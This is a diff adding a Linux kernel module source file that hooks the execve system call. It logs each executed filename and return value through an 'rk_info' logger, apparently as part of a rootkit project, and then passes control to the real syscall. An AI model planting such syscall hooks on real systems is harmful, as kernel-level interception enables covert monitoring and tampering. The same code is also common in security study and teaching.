@@ -1,0 +1,43 @@
+#include <linux/module.h>
+#include <linux/slab.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+#include "../../logger/logger.h"
+#include "../utils.h"
+#include "execve.h"
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+asmlinkage long (*real_execve)(const struct pt_regs *);
+
+// ////////////////////////////////////////////////////////////////////
+
+asmlinkage long hook_execve(const struct pt_regs *regs) {
+    char *kernel_filename = duplicate_filename((void *) regs->di);
+
+    rk_info("execve() hooked for: %s\n", kernel_filename);
+
+    kfree(kernel_filename);
+
+    const long ret = real_execve(regs);
+
+    rk_info("execve() true return: %ld\n", ret);
+
+    return ret;
+}
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+EXPORT_SYMBOL(hook_execve);
+EXPORT_SYMBOL(real_execve);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Aspheric_");
+MODULE_DESCRIPTION("Hooks execve");
